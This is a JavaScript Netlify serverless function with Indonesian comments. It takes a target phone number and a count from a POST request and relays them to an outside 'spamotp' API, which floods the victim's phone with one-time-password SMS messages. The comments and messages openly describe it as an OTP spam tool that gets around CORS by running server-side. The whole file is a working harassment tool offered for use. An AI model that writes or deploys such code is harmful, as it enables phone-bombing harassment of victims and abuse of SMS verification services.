const fetch = require('node-fetch'); // Jika menggunakan runtime lama. Untuk Node 18+ bawaan Netlify, global fetch otomatis aktif.

exports.handler = async (event, context) => {
    // Batasi hanya untuk request POST
    if (event.httpMethod !== "POST") {
        return {
            statusCode: 405,
            body: JSON.stringify({ success: false, message: "Method Not Allowed" })
        };
    }

    try {
        const { phone, count } = JSON.parse(event.body);

        if (!phone || !count) {
            return {
                statusCode: 400,
                body: JSON.stringify({ success: false, message: "Nomor target dan jumlah spam wajib diisi!" })
            };
        }

        // Eksekusi tembak langsung ke API target dari server Netlify (Bebas CORS)
        const targetApi = `https://owens.my.id/spamotp/api.php?no=${encodeURIComponent(phone)}&jum=${encodeURIComponent(count)}`;
        
        const response = await fetch(targetApi, { method: 'GET' });
        const resText = await response.text();

        // Validasi jika API target mengembalikan data kosong atau ada indikasi gagal
        if (!response.ok || resText.trim() === "" || resText.toLowerCase().includes("gagal")) {
            return {
                statusCode: 502,
                body: JSON.stringify({ success: false, message: resText || "API target down/berubah." })
            };
        }

        return {
            statusCode: 200,
            headers: { 
                "Content-Type": "application/json",
                "Access-Control-Allow-Origin": "*" // Menjaga kelancaran CORS
            },
            body: JSON.stringify({ success: true, message: "Spam OTP berhasil diproses!", data: resText })
        };

    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ success: false, message: "Server error: " + error.message })
        };
    }
};
